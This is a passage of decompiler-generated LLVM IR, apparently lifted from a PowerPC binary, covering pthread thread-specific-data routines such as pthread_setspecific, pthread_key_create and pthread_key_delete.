  store i32 %v3_10017ac4, i32* %r0.global-to-local, align 4
  store i32 %v2_10017a5c, i32* @r3, align 4
  %v4_10017acc = icmp eq i32 %v0_10017aa4, %v3_10017ac4
  br i1 %v4_10017acc, label %dec_label_pc_10017b1c, label %dec_label_pc_10017ad4

dec_label_pc_10017ad4:                            ; preds = %dec_label_pc_10017abc
  store i32 268532440, i32* @lr, align 4
  %v1_10017ad4 = call i32 @__GI_sigdelset(i32 %v2_10017a5c)
  %v0_10017adc = load i32, i32* @r29, align 4
  %v1_10017adc = mul i32 %v0_10017adc, 4
  store i32 %v1_10017adc, i32* %r0.global-to-local, align 4
  %v2_10017ae4 = add i32 %v1_10017adc, ptrtoint (i32* @global_var_100496f0.1099 to i32)
  %v3_10017ae4 = inttoptr i32 %v2_10017ae4 to i32*
  %v4_10017ae4 = load i32, i32* %v3_10017ae4, align 4
  store i32 %v4_10017ae4, i32* %r0.global-to-local, align 4
  store i32 %v2_10017ae8, i32* @r3, align 4
  %v2_10017aec = icmp ugt i32 %v4_10017ae4, 1
  br i1 %v2_10017aec, label %dec_label_pc_10017b1c, label %dec_label_pc_10017af4

dec_label_pc_10017af4:                            ; preds = %dec_label_pc_10017ad4
  store i32 268531396, i32* %stack_var_-772, align 4
  store i32 268532484, i32* @lr, align 4
  %v1_10017b00 = call i32 @sigemptyset(i32 %v2_10017ae8)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10017b0c = load i32, i32* @r29, align 4
  store i32 268532508, i32* @lr, align 4
  %v4_10017b18 = call i32 @__GI_sigaction(i32 %v0_10017b0c, i32* nonnull %stack_var_-772, i32 0)
  br label %dec_label_pc_10017b1c

dec_label_pc_10017b1c:                            ; preds = %dec_label_pc_10017ad4, %dec_label_pc_10017abc, %dec_label_pc_10017aac, %dec_label_pc_10017a9c, %dec_label_pc_10017a90, %dec_label_pc_10017af4
  %v0_10017b1c = load i32, i32* @r29, align 4
  %v1_10017b1c = add i32 %v0_10017b1c, 1
  store i32 %v1_10017b1c, i32* @r29, align 4
  %v0_10017b28 = load i32, i32* @r31, align 4
  store i32 %v0_10017b28, i32* @r3, align 4
  %tmp23 = icmp slt i32 %v1_10017b1c, 66
  br i1 %tmp23, label %dec_label_pc_10017a90, label %dec_label_pc_10017b30

dec_label_pc_10017b30:                            ; preds = %dec_label_pc_10017b1c, %entry
  %v2_10017b30 = ptrtoint i32* %stack_var_-624 to i32
  store i32 1, i32* @r4, align 4
  store i32 268532540, i32* @lr, align 4
  %v3_10017b38 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  store i32 %v3_10017b38, i32* %r11.global-to-local, align 4
  %v3_10017b3c = icmp eq i32 %v3_10017b38, 0
  br i1 %v3_10017b3c, label %dec_label_pc_10017b44, label %dec_label_pc_10017b30.dec_label_pc_10017b8c_crit_edge

dec_label_pc_10017b30.dec_label_pc_10017b8c_crit_edge: ; preds = %dec_label_pc_10017b30
  %.pre = add i32 %v0_10017a70, 40
  %.pre11 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10017b8c

dec_label_pc_10017b44:                            ; preds = %dec_label_pc_10017b30
  store i32 %v2_10017b30, i32* %r0.global-to-local, align 4
  %v2_10017b4c = add i32 %v0_10017a70, 40
  %v3_10017b4c = inttoptr i32 %v2_10017b4c to i32*
  store i32 %v2_10017b30, i32* %v3_10017b4c, align 4
  %v1_10017b54 = add i32 %v0_10017a70, 66
  %v2_10017b54 = inttoptr i32 %v1_10017b54 to i8*
  %v3_10017b54 = load i8, i8* %v2_10017b54, align 1
  %v4_10017b54 = zext i8 %v3_10017b54 to i32
  store i32 %v4_10017b54, i32* %r0.global-to-local, align 4
  %v3_10017b58 = icmp eq i8 %v3_10017b54, 0
  br i1 %v3_10017b58, label %dec_label_pc_10017b70, label %dec_label_pc_10017b60

dec_label_pc_10017b60:                            ; preds = %dec_label_pc_10017b44
  %v1_10017b64 = add i32 %v0_10017a70, 64
  %v2_10017b64 = inttoptr i32 %v1_10017b64 to i8*
  %v3_10017b64 = load i8, i8* %v2_10017b64, align 1
  %v4_10017b64 = zext i8 %v3_10017b64 to i32
  store i32 %v4_10017b64, i32* %r0.global-to-local, align 4
  %v3_10017b68 = icmp eq i8 %v3_10017b64, 0
  br i1 %v3_10017b68, label %dec_label_pc_10017b8c, label %dec_label_pc_10017b70

dec_label_pc_10017b70:                            ; preds = %dec_label_pc_10017b60, %dec_label_pc_10017b44
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10017b7c = load i32, i32* %r11.global-to-local, align 4
  %v2_10017b7c = add i32 %v0_10017a70, 32
  %v3_10017b7c = inttoptr i32 %v2_10017b7c to i32*
  store i32 %v0_10017b7c, i32* %v3_10017b7c, align 4
  %v0_10017b84 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017b84 = trunc i32 %v0_10017b84 to i8
  %v3_10017b84 = add i32 %v0_10017a70, 88
  %v4_10017b84 = inttoptr i32 %v3_10017b84 to i8*
  store i8 %v1_10017b84, i8* %v4_10017b84, align 1
  store i32 268532620, i32* @lr, align 4
  %v1_10017b88 = call i32 @__libc_sigsuspend(i32 %v2_10017a5c)
  br label %dec_label_pc_10017b8c

dec_label_pc_10017b8c:                            ; preds = %dec_label_pc_10017b30.dec_label_pc_10017b8c_crit_edge, %dec_label_pc_10017b60, %dec_label_pc_10017b70
  %v3_10017b94.pre-phi = phi i32* [ %.pre11, %dec_label_pc_10017b30.dec_label_pc_10017b8c_crit_edge ], [ %v3_10017b4c, %dec_label_pc_10017b60 ], [ %v3_10017b4c, %dec_label_pc_10017b70 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10017b94.pre-phi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017b9c.1102 to i32), i32* @lr, align 4
  %v1_10017b98 = call i32 @pthread_testcancel(i32 %v0_10017a70)
  %v1_10017ba4 = add i32 %v0_10017a70, 32
  %v2_10017ba4 = inttoptr i32 %v1_10017ba4 to i32*
  %v3_10017ba4 = load i32, i32* %v2_10017ba4, align 4
  store i32 %v3_10017ba4, i32* %arg2, align 4
  store i32 %v0_10017a54, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10017b28, { 1, 0 }
  uselistorder i32 %v1_10017b1c, { 0, 2, 1 }
  uselistorder i32 %v1_10017adc, { 1, 0 }
  uselistorder i32 %v0_10017b201, { 1, 0 }
  uselistorder i32 %v0_10017a70, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i32 %v2_10017a5c, { 2, 0, 3, 5, 4, 1, 6 }
  uselistorder i32 (i32)* @__libc_sigsuspend, { 1, 0 }
  uselistorder i32 (i32)* @sigemptyset, { 5, 2, 1, 0, 4, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_100496f0.1099 to i32), { 0, 1, 2, 5, 3, 6, 4 }
  uselistorder i32 33, { 0, 2, 5, 1, 3, 4 }
  uselistorder i32 66, { 3, 0, 1, 4, 5, 12, 10, 6, 7, 13, 8, 9, 11, 2 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder label %dec_label_pc_10017b8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017b1c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10017a90, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10017bc8 = load i32, i32* @lr, align 4
  %v2_10017bcc = icmp ugt i32 %arg1, 1023
  store i32 %arg2, i32* @r27, align 4
  %v1_10017be0 = mul i32 %arg1, 8
  store i32 %v1_10017be0, i32* %r0.global-to-local, align 4
  %v0_10017be4 = load i32, i32* @r2, align 4
  store i32 %v0_10017be4, i32* @r28, align 4
  br i1 %v2_10017bcc, label %dec_label_pc_10017c54, label %dec_label_pc_10017bec

dec_label_pc_10017bec:                            ; preds = %entry
  %v1_10017bec = udiv i32 %arg1, 32
  store i32 %v1_10017bec, i32* @r29, align 4
  %v2_10017c04 = add i32 %v1_10017be0, ptrtoint (i32* @global_var_100497f4.1103 to i32)
  %v3_10017c04 = inttoptr i32 %v2_10017c04 to i32*
  %v4_10017c04 = load i32, i32* %v3_10017c04, align 4
  store i32 %v4_10017c04, i32* %r0.global-to-local, align 4
  %v3_10017c08 = icmp eq i32 %v4_10017c04, 0
  br i1 %v3_10017c08, label %dec_label_pc_10017c54, label %dec_label_pc_10017c10

dec_label_pc_10017c10:                            ; preds = %dec_label_pc_10017bec
  %v1_10017bf0 = mul nuw nsw i32 %v1_10017bec, 4
  %v2_10017bf4 = add i32 %v0_10017be4, %v1_10017bf0
  %v1_10017c10 = add i32 %v2_10017bf4, 236
  %v2_10017c10 = inttoptr i32 %v1_10017c10 to i32*
  %v3_10017c10 = load i32, i32* %v2_10017c10, align 4
  store i32 %v3_10017c10, i32* %r0.global-to-local, align 4
  %v3_10017c1c = icmp eq i32 %v3_10017c10, 0
  br i1 %v3_10017c1c, label %dec_label_pc_10017c24, label %dec_label_pc_10017c38

dec_label_pc_10017c24:                            ; preds = %dec_label_pc_10017c10
  store i32 ptrtoint (i32* @global_var_10017c28.1104 to i32), i32* @lr, align 4
  %v2_10017c24 = call i32 @calloc(i32 32, i32 4)
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_10017c2c = icmp eq i32 %v2_10017c24, 0
  br i1 %v3_10017c2c, label %dec_label_pc_10017c58, label %dec_label_pc_10017c34

dec_label_pc_10017c34:                            ; preds = %dec_label_pc_10017c24
  %v1_10017c34 = load i32, i32* @r30, align 4
  %v2_10017c34 = add i32 %v1_10017c34, 12
  %v3_10017c34 = inttoptr i32 %v2_10017c34 to i32*
  store i32 %v2_10017c24, i32* %v3_10017c34, align 4
  %v0_10017c38.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10017c38

dec_label_pc_10017c38:                            ; preds = %dec_label_pc_10017c10, %dec_label_pc_10017c34
  %v0_10017c38 = phi i32 [ %v1_10017bec, %dec_label_pc_10017c10 ], [ %v0_10017c38.pre, %dec_label_pc_10017c34 ]
  %v1_10017c38 = mul i32 %v0_10017c38, 4
  %v1_10017c3c = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10017c40 = load i32, i32* @r28, align 4
  %v2_10017c40 = add i32 %v1_10017c40, %v1_10017c38
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10017c48 = add i32 %v2_10017c40, 236
  %v2_10017c48 = inttoptr i32 %v1_10017c48 to i32*
  %v3_10017c48 = load i32, i32* %v2_10017c48, align 4
  %v0_10017c4c = load i32, i32* @r27, align 4
  %v3_10017c4c = add i32 %v3_10017c48, %v1_10017c3c
  %v4_10017c4c = inttoptr i32 %v3_10017c4c to i32*
  store i32 %v0_10017c4c, i32* %v4_10017c4c, align 4
  %v0_10017c58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10017c58

dec_label_pc_10017c54:                            ; preds = %dec_label_pc_10017bec, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10017c58

dec_label_pc_10017c58:                            ; preds = %dec_label_pc_10017c24, %dec_label_pc_10017c38, %dec_label_pc_10017c54
  %v0_10017c58 = phi i32 [ 12, %dec_label_pc_10017c24 ], [ %v0_10017c58.pre, %dec_label_pc_10017c38 ], [ 22, %dec_label_pc_10017c54 ]
  store i32 %v0_10017bc8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10017c58

; uselistorder directives
  uselistorder i32 %v1_10017bec, { 2, 0, 1 }
  uselistorder i32 %v1_10017be0, { 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10017c58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017c38, { 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10017ca4.lr.ph:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10017c74 = load i32, i32* @lr, align 4
  store i32 %v0_10017c74, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10017c94.1106 to i32), i32* @lr, align 4
  %v1_10017c90 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32))
  store i32 %v1_10017c90, i32* %r3.global-to-local, align 4
  store i32 1025, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_100497f4.1103 to i32), i32* @r9, align 4
  br label %dec_label_pc_10017ca4

dec_label_pc_10017ca4:                            ; preds = %dec_label_pc_10017ca4.lr.ph, %dec_label_pc_10017cd4
  %v1_10017cb4 = phi i32 [ ptrtoint (i32* @global_var_100497f4.1103 to i32), %dec_label_pc_10017ca4.lr.ph ], [ %v2_10017ce4, %dec_label_pc_10017cd4 ]
  %v0_10017ce8 = phi i32 [ 1024, %dec_label_pc_10017ca4.lr.ph ], [ %v1_10017ce8, %dec_label_pc_10017cd4 ]
  %v0_10017cd4 = phi i32 [ 0, %dec_label_pc_10017ca4.lr.ph ], [ %v1_10017cd4, %dec_label_pc_10017cd4 ]
  %v0_10017ca4 = phi i32 [ 0, %dec_label_pc_10017ca4.lr.ph ], [ %v1_10017cdc, %dec_label_pc_10017cd4 ]
  %v2_10017ca4 = add i32 %v0_10017ca4, ptrtoint (i32* @global_var_100497f4.1103 to i32)
  %v3_10017ca4 = inttoptr i32 %v2_10017ca4 to i32*
  %v4_10017ca4 = load i32, i32* %v3_10017ca4, align 4
  store i32 %v4_10017ca4, i32* %r0.global-to-local, align 4
  %v3_10017ca8 = icmp eq i32 %v4_10017ca4, 0
  br i1 %v3_10017ca8, label %dec_label_pc_10017cb0, label %dec_label_pc_10017cd4

dec_label_pc_10017cb0:                            ; preds = %dec_label_pc_10017ca4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10017cb4 = load i32, i32* @r30, align 4
  %v2_10017cb4 = add i32 %v1_10017cb4, 4
  %v3_10017cb4 = inttoptr i32 %v2_10017cb4 to i32*
  store i32 %v0_10017cb4, i32* %v3_10017cb4, align 4
  %v0_10017cb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017cb8 = load i32, i32* @r11, align 4
  %v2_10017cb8 = load i32, i32* @r9, align 4
  %v3_10017cb8 = add i32 %v2_10017cb8, %v1_10017cb8
  %v4_10017cb8 = inttoptr i32 %v3_10017cb8 to i32*
  store i32 %v0_10017cb8, i32* %v4_10017cb8, align 4
  store i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017cc8.1108 to i32), i32* @lr, align 4
  %v0_10017cc4 = call i32 @pthread_mutex_unlock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10017ccc = load i32, i32* @r31, align 4
  %v1_10017ccc = load i32, i32* @r29, align 4
  %v2_10017ccc = inttoptr i32 %v1_10017ccc to i32*
  store i32 %v0_10017ccc, i32* %v2_10017ccc, align 4
  %v0_10017d0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017cfc

dec_label_pc_10017cd4:                            ; preds = %dec_label_pc_10017ca4
  %v1_10017cd4 = add nuw nsw i32 %v0_10017cd4, 1
  store i32 %v1_10017cd4, i32* @r31, align 4
  %v1_10017cdc = mul i32 %v1_10017cd4, 8
  store i32 %v1_10017cdc, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_100497f4.1103 to i32), i32* @r9, align 4
  %v2_10017ce4 = add i32 %v1_10017cdc, ptrtoint (i32* @global_var_100497f4.1103 to i32)
  %v1_10017ce8 = add nsw i32 %v0_10017ce8, -1
  %v2_10017ce8 = icmp eq i32 %v1_10017ce8, 0
  br i1 %v2_10017ce8, label %dec_label_pc_10017cec, label %dec_label_pc_10017ca4

dec_label_pc_10017cec:                            ; preds = %dec_label_pc_10017cd4
  store i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017cf8.1109 to i32), i32* @lr, align 4
  %v0_10017cf4 = call i32 @pthread_mutex_unlock()
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017cfc

dec_label_pc_10017cfc:                            ; preds = %dec_label_pc_10017cb0, %dec_label_pc_10017cec
  %v0_10017d0c = phi i32 [ %v0_10017d0c.pre, %dec_label_pc_10017cb0 ], [ 11, %dec_label_pc_10017cec ]
  store i32 %v0_10017c74, i32* %r0.global-to-local, align 4
  ret i32 %v0_10017d0c

; uselistorder directives
  uselistorder i32 %v1_10017ce8, { 1, 0 }
  uselistorder i32 %v1_10017cdc, { 1, 0, 2 }
  uselistorder i32 %v1_10017cd4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_10017cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10017ca4, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 268763136, i32* @r9, align 4
  %v0_10017d18 = load i32, i32* @lr, align 4
  store i32 %v0_10017d18, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), i32* @r30, align 4
  %v0_10017d30 = load i32, i32* @r2, align 4
  store i32 %v0_10017d30, i32* @r29, align 4
  store i32 268533048, i32* @lr, align 4
  %v1_10017d34 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32))
  %v2_10017d38 = icmp ugt i32 %arg1, 1023
  br i1 %v2_10017d38, label %dec_label_pc_10017d5c, label %dec_label_pc_10017d40

dec_label_pc_10017d40:                            ; preds = %entry
  store i32 268763136, i32* @r9, align 4
  %v1_10017d44 = mul i32 %arg1, 8
  store i32 %v1_10017d44, i32* @r11, align 4
  %v2_10017d4c = add i32 %v1_10017d44, ptrtoint (i32* @global_var_100497f4.1103 to i32)
  %v3_10017d4c = inttoptr i32 %v2_10017d4c to i32*
  %v4_10017d4c = load i32, i32* %v3_10017d4c, align 4
  store i32 %v4_10017d4c, i32* %r0.global-to-local, align 4
  store i32 %v2_10017d4c, i32* @r8, align 4
  %v3_10017d54 = icmp eq i32 %v4_10017d4c, 0
  br i1 %v3_10017d54, label %dec_label_pc_10017d5c, label %dec_label_pc_10017d6c

dec_label_pc_10017d5c:                            ; preds = %dec_label_pc_10017d40, %entry
  %v0_10017d5c = load i32, i32* @r30, align 4
  store i32 %v0_10017d5c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017d64.1110 to i32), i32* @lr, align 4
  %v0_10017d60 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10017dd0

dec_label_pc_10017d6c:                            ; preds = %dec_label_pc_10017d40
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10017d74 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 %v3_10017d74, i32* @r9, align 4
  store i32 0, i32* %v3_10017d4c, align 4
  %v0_10017d7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10017d7c = load i32, i32* @r8, align 4
  %v2_10017d7c = add i32 %v1_10017d7c, 4
  %v3_10017d7c = inttoptr i32 %v2_10017d7c to i32*
  store i32 %v0_10017d7c, i32* %v3_10017d7c, align 4
  %v0_10017d80 = load i32, i32* @r9, align 4
  %v3_10017d80 = icmp eq i32 %v0_10017d80, -1
  br i1 %v3_10017d80, label %dec_label_pc_10017dc0, label %dec_label_pc_10017d88

dec_label_pc_10017d88:                            ; preds = %dec_label_pc_10017d6c
  %v1_10017d88 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v0_10017d8c = load i32, i32* @r29, align 4
  store i32 %v0_10017d8c, i32* @r9, align 4
  %v1_10017d90 = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  %v0_10017d94.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10017d94

dec_label_pc_10017d94:                            ; preds = %dec_label_pc_10017db4, %dec_label_pc_10017d88
  %v0_10017d94 = phi i32 [ %v2_10017db4, %dec_label_pc_10017db4 ], [ %v0_10017d94.pre, %dec_label_pc_10017d88 ]
  %v1_10017d94 = add i32 %v0_10017d94, 44
  %v2_10017d94 = inttoptr i32 %v1_10017d94 to i8*
  %v3_10017d94 = load i8, i8* %v2_10017d94, align 1
  %v4_10017d94 = zext i8 %v3_10017d94 to i32
  store i32 %v4_10017d94, i32* %r0.global-to-local, align 4
  %v2_10017d98 = add i32 %v0_10017d94, %v1_10017d90
  store i32 %v2_10017d98, i32* @r11, align 4
  %v3_10017d9c = icmp eq i8 %v3_10017d94, 0
  br i1 %v3_10017d9c, label %dec_label_pc_10017da4, label %dec_label_pc_10017db4

dec_label_pc_10017da4:                            ; preds = %dec_label_pc_10017d94
  %v1_10017da4 = add i32 %v2_10017d98, 236
  %v2_10017da4 = inttoptr i32 %v1_10017da4 to i32*
  %v3_10017da4 = load i32, i32* %v2_10017da4, align 4
  store i32 %v3_10017da4, i32* @r11, align 4
  %v3_10017da8 = icmp eq i32 %v3_10017da4, 0
  br i1 %v3_10017da8, label %dec_label_pc_10017db4, label %dec_label_pc_10017db0

dec_label_pc_10017db0:                            ; preds = %dec_label_pc_10017da4
  %v3_10017db0 = add i32 %v3_10017da4, %v1_10017d88
  %v4_10017db0 = inttoptr i32 %v3_10017db0 to i32*
  store i32 %v4_10017d94, i32* %v4_10017db0, align 4
  %v0_10017db4.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10017db4

dec_label_pc_10017db4:                            ; preds = %dec_label_pc_10017d94, %dec_label_pc_10017da4, %dec_label_pc_10017db0
  %v0_10017db4 = phi i32 [ %v0_10017d94, %dec_label_pc_10017d94 ], [ %v0_10017d94, %dec_label_pc_10017da4 ], [ %v0_10017db4.pre, %dec_label_pc_10017db0 ]
  %v1_10017db4 = inttoptr i32 %v0_10017db4 to i32*
  %v2_10017db4 = load i32, i32* %v1_10017db4, align 4
  store i32 %v2_10017db4, i32* @r9, align 4
  %v1_10017db8 = load i32, i32* @r29, align 4
  %v4_10017db8 = icmp eq i32 %v2_10017db4, %v1_10017db8
  br i1 %v4_10017db8, label %dec_label_pc_10017dc0, label %dec_label_pc_10017d94

dec_label_pc_10017dc0:                            ; preds = %dec_label_pc_10017db4, %dec_label_pc_10017d6c
  store i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10017dcc.1111 to i32), i32* @lr, align 4
  %v0_10017dc8 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10017dd0

dec_label_pc_10017dd0:                            ; preds = %dec_label_pc_10017d5c, %dec_label_pc_10017dc0
  %storemerge = phi i32 [ 22, %dec_label_pc_10017d5c ], [ 0, %dec_label_pc_10017dc0 ]
  store i32 %v0_10017d18, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10017db4, { 1, 2, 0 }
  uselistorder i32 %v0_10017d94, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10017d44, { 1, 0 }
  uselistorder i32* @global_var_100450c4.984, { 4, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20 }
  uselistorder i32 ptrtoint (i32* @global_var_1004b7f4.1105 to i32), { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10017dd0, { 1, 0 }
  uselistorder label %dec_label_pc_10017db4, { 2, 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10017de4 = mul i32 %arg1, 4
  %v1_10017de8 = load i32, i32* @r2, align 4
  %v2_10017de8 = add i32 %v1_10017de4, 364
  %v1_10017dec = add i32 %v2_10017de8, %v1_10017de8
  ret i32 %v1_10017dec
}

define i32 @__pthread_internal_tsd_get(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10017df4 = mul i32 %arg1, 4
  %v1_10017df8 = load i32, i32* @r2, align 4
  %v2_10017df8 = add i32 %v1_10017df8, %v1_10017df4
  %v1_10017dfc = add i32 %v2_10017df8, 364
  %v2_10017dfc = inttoptr i32 %v1_10017dfc to i32*
  %v3_10017dfc = load i32, i32* %v2_10017dfc, align 4
  ret i32 %v3_10017dfc
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10017e04 = mul i32 %arg1, 4
  %v1_10017e08 = load i32, i32* @r2, align 4
  %v2_10017e08 = add i32 %v1_10017e04, 364
  %v2_10017e0c = add i32 %v2_10017e08, %v1_10017e08
  %v3_10017e0c = inttoptr i32 %v2_10017e0c to i32*
  store i32 %arg2, i32* %v3_10017e0c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 1, i32* @r8, align 4
  %v0_10017e28 = load i32, i32* @r2, align 4
  store i32 %v0_10017e28, i32* @r29, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10017ed0

dec_label_pc_10017e38:                            ; preds = %dec_label_pc_10017ed8, %dec_label_pc_10017eb8
  %v0_10017ec8.pr16 = phi i32 [ 0, %dec_label_pc_10017ed8 ], [ %v0_10017ec8.pr, %dec_label_pc_10017eb8 ]
  %v1_10017e40 = phi i32 [ %v1_10017e403, %dec_label_pc_10017ed8 ], [ %v1_10017e404, %dec_label_pc_10017eb8 ]
  %v0_10017e38 = phi i32 [ 0, %dec_label_pc_10017ed8 ], [ %v1_10017eb8, %dec_label_pc_10017eb8 ]
  %v1_10017e38 = mul i32 %v0_10017e38, 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10017e40 = add i32 %v1_10017e38, %v1_10017e40
  %v1_10017e44 = add i32 %v2_10017e40, 236
  %v2_10017e44 = inttoptr i32 %v1_10017e44 to i32*
  %v3_10017e44 = load i32, i32* %v2_10017e44, align 4
  %v3_10017e48 = icmp eq i32 %v3_10017e44, 0
  br i1 %v3_10017e48, label %dec_label_pc_10017eb8, label %dec_label_pc_10017e88.outer

dec_label_pc_10017e54:                            ; preds = %dec_label_pc_10017e88
  %v2_10017e90 = add i32 %v1_10017e88, %v0_10017ea8
  %v1_10017e98 = mul i32 %v2_10017e90, 8
  %v1_10017e54 = add i32 %v1_10017e98, add (i32 ptrtoint (i32* @global_var_100497f4.1103 to i32), i32 4)
  %v2_10017e54 = inttoptr i32 %v1_10017e54 to i32*
  %v3_10017e54 = load i32, i32* %v2_10017e54, align 4
  %v3_10017e5c = icmp eq i32 %v3_10017e54, 0
  br i1 %v3_10017e5c, label %dec_label_pc_10017e88, label %dec_label_pc_10017e68

dec_label_pc_10017e68:                            ; preds = %dec_label_pc_10017e54
  %v3_10017e58 = load i32, i32* %v2_10017e58, align 4
  %v2_10017e60 = add i32 %v3_10017e58, %v1_10017ea8
  %v3_10017e60 = inttoptr i32 %v2_10017e60 to i32*
  store i32 0, i32* %v3_10017e60, align 4
  call void @__pseudo_call(i32 %v3_10017e54)
  store i32 1, i32* @r8, align 4
  %v0_10017e88.pre.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_10017e90.pre.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_10017eac.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10017e88.outer

dec_label_pc_10017e88.outer:                      ; preds = %dec_label_pc_10017e38, %dec_label_pc_10017e68
  %v0_10017ec8.pr14.ph = phi i32 [ 1, %dec_label_pc_10017e68 ], [ %v0_10017ec8.pr16, %dec_label_pc_10017e38 ]
  %v1_10017eac.ph = phi i32 [ %v1_10017eac.pre.pre, %dec_label_pc_10017e68 ], [ %v1_10017e40, %dec_label_pc_10017e38 ]
  %v0_10017ea8.ph = phi i32 [ %v1_10017e90.pre.pre, %dec_label_pc_10017e68 ], [ 0, %dec_label_pc_10017e38 ]
  %v0_10017ea4.ph = phi i32 [ %v0_10017e88.pre.pre, %dec_label_pc_10017e68 ], [ %v0_10017e38, %dec_label_pc_10017e38 ]
  %v1_10017e88 = mul i32 %v0_10017ea4.ph, 32
  %v1_10017ea4 = mul i32 %v0_10017ea4.ph, 4
  %v2_10017eac = add i32 %v1_10017ea4, %v1_10017eac.ph
  %v1_10017e58 = add i32 %v2_10017eac, 236
  %v2_10017e58 = inttoptr i32 %v1_10017e58 to i32*
  br label %dec_label_pc_10017e88

dec_label_pc_10017e88:                            ; preds = %dec_label_pc_10017e88.outer, %dec_label_pc_10017e54
  %v0_10017ea8 = phi i32 [ %v1_10017eb0, %dec_label_pc_10017e54 ], [ %v0_10017ea8.ph, %dec_label_pc_10017e88.outer ]
